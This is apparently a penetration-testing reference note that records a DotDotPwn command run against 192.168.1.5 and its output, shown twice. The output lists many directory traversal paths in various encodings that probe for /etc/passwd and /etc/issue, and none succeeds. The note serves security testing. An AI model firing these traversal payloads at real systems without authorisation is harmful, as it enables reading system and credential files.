---
id: c62e5681-cec4-4318-b8c4-39d8331707b3
name: DotDotPwn Command to Perform Directory Traversal Fuzzing
type: command
executor: ''
data: dotdotpwn -m http -h 192.168.1.5 -M GET
output: '#################################################################################

  #                                                                               #

  #  CubilFelino                                                       Chatsubo   #

  #  Security Research Lab              and            [(in)Security Dark] Labs   #

  #  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #

  #                                                                               #

  #                               pr0udly present:                                #

  #                                                                               #

  #  ________            __  ________            __  __________                   #

  #  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #

  #   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #

  #   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #

  #  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #

  #          \/                      \/                                      \/   #

  #                              - DotDotPwn v3.0.2 -                             #

  #                         The Directory Traversal Fuzzer                        #

  #                         http://dotdotpwn.sectester.net                        #

  #                            dotdotpwn@sectester.net                            #

  #                                                                               #

  #                               by chr1x & nitr0us                              #

  #################################################################################


  [+] Report name: Reports/192.168.1.5_09-03-2020_22-05.txt


  [========== TARGET INFORMATION ==========]

  [+] Hostname: 192.168.1.5

  [+] Protocol: http

  [+] Port: 80


  [=========== TRAVERSAL ENGINE ===========]

  [+] Creating Traversal patterns (mix of dots and slashes)

  [+] Multiplying 6 times the traversal patterns (-d switch)

  [+] Creating the Special Traversal patterns

  [+] Translating (back)slashes in the filenames

  [+] Adapting the filenames according to the OS type detected (unix)

  [+] Including Special sufixes

  [+] Traversal Engine DONE ! - Total traversal tests created: 11028


  [=========== TESTING RESULTS ============]

  [+] Ready to launch 3.33 traversals per second

  [+] Press Enter to start the testing (You can stop it pressing Ctrl + C)


  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../etc/passwd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../etc/issue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../etc/passwd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../etc/issue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../etc/passwd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../etc/issue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../etc/passwd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../etc/issue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../../etc/passwd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../../etc/issue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../../../etc/passwd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../../../etc/issue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5Cetc%5Cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5Cetc%5Cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5Cetc%5Cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5Cetc%5Cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5Cetc%5Cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5Cetc%5Cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5Cetc%5Cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5Cetc%5Cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5C..%5Cetc%5Cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2fetc%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2fetc%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2fetc%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2fetc%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2fetc%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2fetc%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2fetc%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2fetc%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2f..%2fetc%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5cetc%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5cetc%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5cetc%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5cetc%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5cetc%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5cetc%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5cetc%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5cetc%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5c..%5cetc%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5c..%5cetc%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5c..%5c..%5cetc%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2fetc0x2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2fetc0x2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2fetc0x2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2fetc0x2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2fetc0x2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2fetc0x2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2fetc0x2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5cetc0x5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5cetc0x5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5cetc0x5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5cetc0x5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5cetc0x5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5cetc0x5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5cetc0x5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5cetc0x5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc0x5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252fetc%252fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252fetc%252fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252fetc%252fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252fetc%252fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252fetc%252fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252fetc%252fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252fetc%252fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252fetc%252fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252f..%252fetc%252fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%252f..%252f..%252f..%252f..%252f..%252fetc%252fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255cetc%255cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255cetc%255cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255cetc%255cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255cetc%255cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255cetc%255cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255cetc%255cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255cetc%255cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255cetc%255cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255c..%255cetc%255cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255c..%255cetc%255cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%255c..%255c..%255c..%255c..%255c..%255cetc%255cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2fetc%c0%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2fetc%c0%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2fetc%c0%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2fetc%c0%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2fetc%c0%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc%c0%2fissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%afetc%c0%afpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%afetc%c0%afissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%afetc%c0%afpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%afetc%c0%afissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%afetc%c0%afissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5cetc%c0%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5cetc%c0%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5cetc%c0%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5cetc%c0%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5cetc%c0%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5cetc%c0%5cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9cetc%c1%9cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9cetc%c1%9cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9cetc%c1%9cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9cetc%c1%9cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9cetc%c1%9cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cissue

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd

  [*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pcetc%c1%pcpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pcetc%c1%pcissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pcetc%c1%pcpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pcetc%c1%pcissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pcetc%c1%pcpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pcetc%c1%pcissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pc..%c1%pcetc%c1%pcissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9vetc%c0%9vpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9vetc%c0%9vissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9vetc%c0%9vpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9vetc%c0%9vissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9v..%c0%9vetc%c0%9vpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9v..%c0%9vetc%c0%9vissue

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9v..%c0%9v..%c0%9vetc%c0%9vpasswd

  [*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/..%c0%9v..%c0%9v..%c0%9v..%c0%9vetc%c0%9vissue

  ^C

  [+] Total Traversals found: 0

  [-] Fuzz testing aborted

  [+] Report saved: Reports/192.168.1.5_09-03-2020_22-05.txt

  '
created_at: '2020-09-03T18:36:33.270627+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[dotdotpwn]]'
- '[[type]]'
---

# DotDotPwn Command to Perform Directory Traversal Fuzzing

```bash
dotdotpwn -m http -h 192.168.1.5 -M GET
```

## Expected Output

```
#################################################################################
#                                                                               #
#  CubilFelino                                                       Chatsubo   #
#  Security Research Lab              and            [(in)Security Dark] Labs   #
#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
#                                                                               #
#                               pr0udly present:                                #
#                                                                               #
#  ________            __  ________            __  __________                   #
#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
#          \/                      \/                                      \/   #
#                              - DotDotPwn v3.0.2 -                             #
#                         The Directory Traversal Fuzzer                        #
#                         http://dotdotpwn.sectester.net                        #
#                            dotdotpwn@sectester.net                            #
#                                                                               #
#                               by chr1x & nitr0us                              #
#################################################################################

[+] Report name: Reports/192.168.1.5_09-03-2020_22-05.txt

[========== TARGET INFORMATION ==========]
[+] Hostname: 192.168.1.5
[+] Protocol: http
[+] Port: 80

[=========== TRAVERSAL ENGINE ===========]
[+] Creating Traversal patterns (mix of dots and slashes)
[+] Multiplying 6 times the traversal patterns (-d switch)
[+] Creating the Special Traversal patterns
[+] Translating (back)slashes in the filenames
[+] Adapting the filenames according to the OS type detected (unix)
[+] Including Special sufixes
[+] Traversal Engine DONE ! - Total traversal tests created: 11028

[=========== TESTING RESULTS ============]
[+] Ready to launch 3.33 traversals per second
[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)

[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../etc/issue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../etc/issue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../etc/issue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../etc/issue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../../etc/issue
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://192.168.1.5:80/../../../../../../etc/issue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5Cetc%5Cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5Cetc%5Cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5Cetc%5Cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5Cetc%5Cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5Cetc%5Cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5Cetc%5Cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5Cetc%5Cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5Cetc%5Cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5C..%5Cetc%5Cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2fetc%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2fetc%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2fetc%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2fetc%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2fetc%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2fetc%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2fetc%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2fetc%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2f..%2fetc%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5cetc%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5cetc%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5cetc%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5cetc%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5cetc%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5cetc%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5cetc%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5cetc%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5c..%5cetc%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5c..%5cetc%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..%5c..%5c..%5c..%5c..%5c..%5cetc%5cissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2fetc0x2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2fetc0x2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2fetc0x2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2fetc0x2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2fetc0x2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2fetc0x2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2fetc0x2fissue
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fpasswd
[*] HTTP Status: 404 | Testing Path: http://192.168.1.5:80/..0x2f..0x2f..0x2f..0x2f..0x2fetc0x2fissue
